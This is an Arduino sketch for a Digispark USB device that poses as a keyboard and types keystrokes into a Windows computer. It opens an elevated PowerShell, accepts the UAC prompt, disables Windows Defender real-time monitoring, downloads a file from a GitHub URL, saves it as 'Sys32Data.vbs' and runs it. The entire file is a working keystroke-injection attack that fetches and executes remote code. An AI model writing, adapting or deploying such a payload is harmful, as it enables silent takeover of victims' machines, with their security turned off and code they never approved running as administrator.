#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}


void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0);

  // Type out this string letter by letter on the computer (assumes US-style
  // keyboard)
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true;$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$client.DownloadFile('https://raw.githubusercontent.com/hadia-chaudhary/TRYHACKING/main/hello.txt','Sys32Data.vbs')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("start Sys32Data.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){}

}
